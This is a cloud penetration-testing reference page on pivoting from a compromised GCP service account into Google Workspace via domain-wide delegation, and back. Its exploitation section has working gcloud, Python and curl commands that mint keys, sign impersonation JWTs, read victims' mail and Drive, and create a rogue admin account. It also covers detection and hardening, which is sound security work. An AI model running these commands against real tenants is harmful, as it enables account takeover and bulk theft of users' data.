---
cstg_id: CSTG-GCP-WORKSPACE-PIVOTING-LATERAL
title: "GCP Workspace Pivoting - Lateral Movement"
provider: gcp
service: workspace-pivoting
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - "iam.serviceAccounts.getAccessToken (on a Workspace domain-wide-delegated service account)"
  - "iam.serviceAccounts.signJwt / iam.serviceAccounts.implicitDelegation"
  - "iam.serviceAccountKeys.create (to mint a key for a DWD service account)"
  - "roles/owner or roles/iam.securityAdmin on a project hosting a DWD service account"
  - "Google Workspace super admin (admin.google.com) for DWD client authorization"
tools:
  - oauth2 / JWT bearer assertion clients
  - Google API client libraries (Directory, Gmail, Drive, Calendar APIs)
  - gcloud / google-cloud-sdk
  - DWD enumeration scripts (neutral, e.g. "DeleFriend"-style scope probers)
  - GHunt / Workspace OSINT collectors
references:
  - "https://developers.google.com/identity/protocols/oauth2/service-account#delegatingauthority"
  - "https://developers.google.com/admin-sdk/directory/v1/guides/delegation"
  - "https://support.google.com/a/answer/162106"
  - "https://cloud.google.com/iam/docs/service-account-impersonation"
  - "https://cloud.google.com/iam/docs/keys-create-delete"
  - "https://hackingthe.cloud/gcp/exploitation/iam-privilege-escalation/"
  - "https://www.hunters.security/en/blog/delefriend-a-newly-discovered-vulnerability-in-google-workspace-could-pose-imminent-threat"
  - "https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/"
license: CC BY-SA 4.0
---

## Summary

Google Cloud Platform (GCP) projects and Google Workspace (formerly G Suite) are distinct trust domains that share a common identity layer (Google identities and OAuth 2.0). The bridge between them is **domain-wide delegation (DWD)**: a Workspace administrator can authorize a GCP service account to impersonate *any* user in the Workspace domain for a defined set of OAuth scopes. Once that authorization exists, anyone who controls the service account's credentials can mint OAuth tokens as arbitrary Workspace users - reading their mail, files, calendars, contacts, and (with the right scopes) administering the entire Workspace tenant via the Admin SDK Directory API.

This page covers **lateral movement from a compromised GCP foothold into the connected Google Workspace tenant**, and the reverse - using Workspace administrative control to reach GCP. The attacker objective is to convert control of a cloud service account (or a leaked key) into impersonation of high-value human identities, exfiltration of their data, and ultimately tenant-wide super-admin capability. The pivot is attractive because it crosses an organizational boundary that many defenders monitor poorly: GCP audit logging and Workspace audit logging are separate systems, and DWD grants are configured in the Workspace Admin console where most cloud security teams never look.

Key concepts:

- **Service account = OAuth client.** Every GCP service account has a numeric OAuth client ID (`unique_id` / `oauth2_client_id`). DWD is authorized by binding *that client ID* plus a scope list inside Workspace.
- **Impersonation is silent in GCP.** Generating a delegated token uses the service account's own key or a token-creator grant; the act of impersonating a Workspace user happens through Google's OAuth token endpoint, not through a GCP API the project owner sees.
- **The "subject" (sub) claim selects the victim.** A DWD JWT assertion includes a `sub` field naming the user to impersonate. Nothing in the service account limits *which* user can be chosen - only the Workspace authorization limits *which scopes*.

## Prerequisites

This is an assumed-breach scenario. The tester is presumed to already hold one of the following over a GCP service account that is (or might be) domain-wide delegated:

- A **service account key** (JSON), obtained from a leaked file, compromised CI/CD secret, metadata server, Secret Manager, or a `iam.serviceAccountKeys.create` grant on the account.
- The ability to **impersonate** the service account, i.e. `iam.serviceAccounts.getAccessToken`, `iam.serviceAccounts.signJwt`, or `iam.serviceAccounts.getOpenIdToken` on it - or `iam.serviceAccounts.actAs` plus a deployment surface (Compute, Cloud Functions, Cloud Run, GKE) that runs as the account.
- A broad project role (`roles/owner`, `roles/editor`, `roles/iam.serviceAccountAdmin`, `roles/iam.securityAdmin`) that lets the tester create keys or token-creator bindings on candidate accounts.

For the **reverse pivot** (Workspace -> GCP) the prerequisite is Workspace administrative access: a super admin, or a delegated admin role carrying the *Service Account Client Authorization* / *API controls* privilege, or control of a user who is an Organization Administrator in Cloud Identity.

No Workspace authorization needs to be created by the tester for the *forward* pivot - the scenario assumes a DWD grant already exists (a configuration that is extremely common). Where it does not, see Exploitation for the chained path that creates one.

## Enumeration

### 1. Identify the current identity and its service-account reach

```bash
# Who am I, and what can I impersonate?
gcloud auth list
gcloud config get-value account

# Enumerate service accounts in reachable projects
for p in $(gcloud projects list --format='value(projectId)'); do
  echo "== $p =="
  gcloud iam service-accounts list --project "$p" \
    --format='table(email, uniqueId, disabled)'
done
```

The `uniqueId` (a.k.a. the OAuth2 client ID) of each service account is the value to test against Workspace DWD bindings - record it for every account.

### 2. Find who can impersonate / mint keys for each service account

```bash
# Per-service-account IAM policy: look for token-creator / key-admin grants
gcloud iam service-accounts get-iam-policy SA_EMAIL --format=json

# Project-level roles that implicitly grant key creation or actAs
gcloud projects get-iam-policy PROJECT_ID --format=json \
  | jq '.bindings[] | select(.role|test("owner|editor|serviceAccountAdmin|serviceAccountKeyAdmin|serviceAccountTokenCreator|iam.securityAdmin"))'
```

### 3. Detect which service accounts are domain-wide delegated

There is **no GCP API** that reveals DWD authorizations - the binding lives in Workspace. Discovery is therefore behavioural: attempt a delegated token grant for each service account's client ID and observe whether Google issues a token (success implies the client is authorized for that scope).

```python
# Probe a service account key for domain-wide delegation.
# A token is only returned if (client_id, scope) is authorized in Workspace.
from google.oauth2 import service_account

CANDIDATE_SCOPES = [
    "https://www.googleapis.com/auth/admin.directory.user",
    "https://www.googleapis.com/auth/admin.directory.group",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/drive.readonly",
    "https://www.googleapis.com/auth/calendar.readonly",
    "https://www.googleapis.com/auth/cloud-platform",
]

creds = service_account.Credentials.from_service_account_file(
    "sa-key.json", scopes=CANDIDATE_SCOPES)
# 'subject' selects the impersonated Workspace user
delegated = creds.with_subject("victim@example.com")

import google.auth.transport.requests
req = google.auth.transport.requests.Request()
try:
    delegated.refresh(req)          # success == DWD authorized for these scopes
    print("AUTHORIZED:", delegated.token[:24], "...")
except Exception as e:
    print("not authorized:", e)
```

A `unauthorized_client` error in the OAuth response means the client ID is **not** authorized for the requested scope; an `access_denied` may mean the scope is authorized but the `sub` user does not exist or is suspended. Iterating scopes one at a time reveals the exact authorized scope set for each delegated client - this is the "DeleFriend"-style enumeration technique.

### 4. Enumerate the target Workspace domain

Once any delegated, directory-scoped token is obtained, enumerate the tenant:

```bash
# List all users (requires admin.directory.user[.readonly] DWD scope + an admin 'sub')
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://admin.googleapis.com/admin/directory/v1/users?customer=my_customer&maxResults=500" \
  | jq '.users[] | {primaryEmail, isAdmin, isDelegatedAdmin, suspended}'

# List groups and admin roles
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://admin.googleapis.com/admin/directory/v1/groups?customer=my_customer"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://admin.googleapis.com/admin/directory/v1/customer/my_customer/roleassignments"
```

External OSINT (pre- or low-access) can map the domain before authentication: confirm the domain runs Workspace (MX records pointing to `*.google.com`), and enumerate valid user accounts and public profile data with GHunt-style tooling against known email addresses.

## Misconfigurations & Findings

- **Over-scoped DWD grants.** Delegations authorized for `cloud-platform`, `admin.directory.user`, or the full `https://mail.google.com/` scope hand a single service account key the power to read all mail or run the entire directory as a super admin. Scopes are rarely reviewed after initial setup.
- **DWD service accounts with externally reachable keys.** A delegated service account whose JSON key is committed to source control, baked into a container image, stored unencrypted in CI, or recoverable from a VM's metadata/disk is a domain-wide compromise waiting to happen.
- **`serviceAccountKeyAdmin` / `owner` on the project hosting a DWD account.** Anyone who can call `serviceAccountKeys.create` on a delegated account can mint a fresh key and inherit the delegation - no Workspace access required.
- **`serviceAccountTokenCreator` on a DWD account.** Token-creator lets a principal obtain access tokens and signed JWTs for the account without a key file; combined with `signJwt` this is sufficient to forge the DWD assertion.
- **No restriction on the `sub` claim.** Workspace DWD authorizes scopes, not target users. A grant intended to let an app act as a single mailbox actually lets the client impersonate *every* user in the domain, including super admins.
- **Stale delegations.** Client IDs left authorized after the corresponding app or integration is decommissioned. Because the GCP-side service account may be deleted and its numeric ID reused, or the binding simply forgotten, these are invisible drift.
- **Default service accounts delegated.** Delegating the Compute Engine or App Engine *default* service account is especially dangerous because so many workloads run as it.
- **Admin console "API controls" left open** so that any internal user can install marketplace apps / OAuth clients, creating new delegation-like trust paths.

## Exploitation

### iam.serviceAccountKeys.create

If the tester can create a key on a service account that is (or can become) domain-wide delegated, mint one and use it as a DWD client:

```bash
gcloud iam service-accounts keys create dwd.json \
  --iam-account=delegated-sa@PROJECT.iam.gserviceaccount.com
```

Then run the Python probe from Enumeration with `with_subject("<victim>")`. A returned token *is* the victim's authority for the authorized scopes.

### iam.serviceAccounts.getAccessToken

With token-creator rights you do not need a key at all. Generate a delegated access token in two hops - first impersonate the SA, then have *it* sign the DWD assertion:

```bash
# Short-lived token for the delegated SA itself
gcloud auth print-access-token \
  --impersonate-service-account=delegated-sa@PROJECT.iam.gserviceaccount.com
```

For the actual user impersonation, the JWT assertion (which carries `sub`) must be signed by the SA. Use `signJwt`:

### iam.serviceAccounts.signJwt

Construct and sign the DWD assertion directly, then exchange it at the OAuth token endpoint:

```bash
# 1. Build a JWT claim set naming the victim in 'sub' and the desired scope
NOW=$(date +%s); EXP=$((NOW+3600))
cat > claim.json <<EOF
{
  "iss": "delegated-sa@PROJECT.iam.gserviceaccount.com",
  "sub": "victim@example.com",
  "scope": "https://www.googleapis.com/auth/gmail.readonly",
  "aud": "https://oauth2.googleapis.com/token",
  "iat": $NOW, "exp": $EXP
}
EOF

# 2. Have the service account sign it (no key file needed; uses token-creator)
SIGNED=$(gcloud iam service-accounts sign-jwt claim.json - \
  --iam-account=delegated-sa@PROJECT.iam.gserviceaccount.com)

# 3. Exchange the signed assertion for the VICTIM's access token
curl -s https://oauth2.googleapis.com/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer \
  --data-urlencode "assertion=$SIGNED"
# -> { "access_token": "<victim token>", "scope": "...gmail.readonly", ... }
```

The returned `access_token` acts as `victim@example.com` for the granted scope - independent of any GCP IAM permission the victim has.

### Acting on the impersonated user

With a delegated token, exercise the authorized scopes against the relevant API:

```bash
# Read the victim's mail
curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
  "https://gmail.googleapis.com/gmail/v1/users/victim@example.com/messages?maxResults=25"

# Exfiltrate Drive files
curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
  "https://www.googleapis.com/drive/v3/files?fields=files(id,name,mimeType)"

# If the grant includes admin.directory.user, target a SUPER ADMIN as 'sub'
# and create a new admin / reset a password = full tenant takeover:
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  "https://admin.googleapis.com/admin/directory/v1/users" \
  -d '{"primaryEmail":"svc-helper@example.com","name":{"givenName":"Svc","familyName":"Helper"},"password":"Str0ng-Temp-Pass!","changePasswordAtNextLogin":false}'
```

Privilege escalation to super admin: with a directory-management DWD scope and a super-admin `sub`, the token can assign the `_SEED_ADMIN_ROLE` (or any admin role) to a controlled account via the `roleAssignments` API, or reset a target admin's recovery details - converting data access into persistent tenant control.

### Chained path: create the delegation (project owner -> Workspace)

If no usable DWD grant exists but the tester holds both a GCP project (to create a service account) **and** Workspace super admin (forward chain is unnecessary then, but this is the explicit GCP->Workspace establishment):

1. Create a service account; record its `uniqueId` (OAuth client ID).
2. In **admin.google.com -> Security -> API controls -> Domain-wide delegation**, add the client ID with high-value scopes (`admin.directory.user`, `https://mail.google.com/`).
3. Impersonate any user as above.

This is also the **reverse pivot**: a Workspace super admin (or anyone holding the *Service Account Client Authorization* admin privilege) can authorize a service account they control in GCP and thereby grant themselves data access across the domain, and - if the authorized service account also has GCP IAM roles - move *into* GCP by impersonating that service account.

### Reverse pivot: Workspace -> GCP

Workspace and GCP share Cloud Identity. A Workspace super admin can be (or can self-assign) the **Organization Administrator** role at the GCP organization node, from which they grant themselves `roles/owner` on projects, create keys, and pivot into the entire GCP estate. Enumerate the link with:

```bash
gcloud organizations list
gcloud organizations get-iam-policy ORG_ID --format=json \
  | jq '.bindings[] | select(.role=="roles/resourcemanager.organizationAdmin")'
```

## Detection & Logging

DWD pivots are split across two log planes; correlation is essential.

**Cloud Audit Logs (GCP side):**
- `google.iam.credentials.v1.IAMCredentials.GenerateAccessToken`, `.SignJwt`, `.SignBlob`, and `.GenerateIdToken` admin-activity / data-access events reveal impersonation of the delegated service account. The `protoPayload.authenticationInfo.principalEmail` shows *who* impersonated, and the request names the target SA. Spikes in `SignJwt` for an account are a strong DWD-abuse signal.
- `google.iam.admin.v1.CreateServiceAccountKey` records new key creation on a service account - high-signal when the target is delegated.
- `SetIamPolicy` on a service account adding `roles/iam.serviceAccountTokenCreator` is the binding that enables keyless abuse.
- Note: the actual user-impersonation token exchange happens at Google's OAuth endpoint and does **not** appear in the customer's GCP Cloud Audit Logs - absence of a GCP record does not mean no impersonation occurred.

**Workspace Admin audit / Login & Token logs:**
- The **Token audit log** (Admin console -> Reporting -> Audit -> Token, or Reports API `applicationName=token`) records OAuth authorizations and shows the `client_id` and scopes used to act as a user - delegated activity attributes the service account's client ID against many different users.
- The **Admin audit log** records DWD authorization changes (adding/removing API clients under domain-wide delegation) and admin-role assignments.
- The **Login audit log** and Gmail/Drive audit logs reveal anomalous access patterns: one OAuth client reading many users' mailboxes, mass Drive downloads, or directory writes from an unfamiliar client ID.

**Managed detections:** Security Command Center and Workspace alert center surface anomalous service-account key creation, new DWD grants, and suspicious admin actions. Correlation rules should flag a single service-account OAuth client ID appearing as `sub` across multiple distinct users, and any new entry in the domain-wide delegation list.

## Remediation & Hardening

- **Inventory and minimize DWD.** Periodically export the domain-wide delegation list (API controls page) and justify every client ID and scope. Remove stale grants. Treat `admin.directory.*`, `https://mail.google.com/`, full `drive`, and `cloud-platform` delegations as crown-jewel risks.
- **Scope down.** Authorize the narrowest read-only scopes an integration needs; never grant directory-write or full-mail scopes for convenience.
- **Eliminate user-managed keys** on delegated service accounts. Disable key creation org-wide with the `iam.disableServiceAccountKeyCreation` and `iam.disableServiceAccountKeyUpload` org policy constraints; use workload identity / impersonation instead.
- **Lock down impersonation.** Audit and minimize `roles/iam.serviceAccountTokenCreator`, `serviceAccountKeyAdmin`, `serviceAccountAdmin`, `owner`, and `editor` on projects that host any delegated service account. Prefer dedicated, tightly-scoped projects for delegated accounts.
- **Constrain who can authorize delegation in Workspace.** Restrict the *Service Account Client Authorization* admin privilege; require multi-party review for new DWD grants; enable admin-action approval / 2-step verification for super admins.
- **Restrict third-party app/API access** in Workspace (block uninstalled OAuth clients by default; allowlist trusted client IDs).
- **Monitor and alert** on `SignJwt`/`GenerateAccessToken` against delegated accounts, on new service-account keys, on Token-audit-log entries where one client acts as many users, and on any change to the domain-wide delegation list.
- **Separate super-admin identities** from day-to-day GCP organization-admin identities to limit blast radius of the reverse pivot; enforce hardware-key 2SV on super admins.
- **Rotate and revoke** keys of any delegated account suspected of exposure, and remove the DWD grant if the integration is gone.

## Tools

- **gcloud / google-cloud-sdk** - service-account enumeration, key creation, `sign-jwt`, and impersonation token generation.
- **Google API client libraries** (Python `google-auth`, Directory/Gmail/Drive/Calendar SDKs) - building delegated credentials with `with_subject()` and exercising authorized scopes.
- **DWD scope-probing scripts** (neutral, "DeleFriend"-style) - brute-force which scopes a given service-account client ID is authorized for in a target domain.
- **OAuth/JWT bearer clients** (`curl`, generic JWT signers) - direct assertion exchange at `oauth2.googleapis.com/token`.
- **GHunt and Workspace OSINT collectors** - unauthenticated mapping of a domain's Google identities and public profile data.

## References

- Google: Using OAuth 2.0 for server-to-server applications - delegating domain-wide authority. https://developers.google.com/identity/protocols/oauth2/service-account#delegatingauthority
- Google Admin SDK: Perform Google Workspace domain-wide delegation. https://developers.google.com/admin-sdk/directory/v1/guides/delegation
- Google Workspace Admin Help: Control API access with domain-wide delegation. https://support.google.com/a/answer/162106
- Google Cloud: Service account impersonation. https://cloud.google.com/iam/docs/service-account-impersonation
- Google Cloud: Create and delete service account keys. https://cloud.google.com/iam/docs/keys-create-delete
- Hunters Security: DeleFriend - domain-wide delegation vulnerability research. https://www.hunters.security/en/blog/delefriend-a-newly-discovered-vulnerability-in-google-workspace-could-pose-imminent-threat
- HackingTheCloud: GCP IAM privilege escalation. https://hackingthe.cloud/gcp/exploitation/iam-privilege-escalation/
- Rhino Security Labs: GCP enumeration and privilege escalation research. https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/
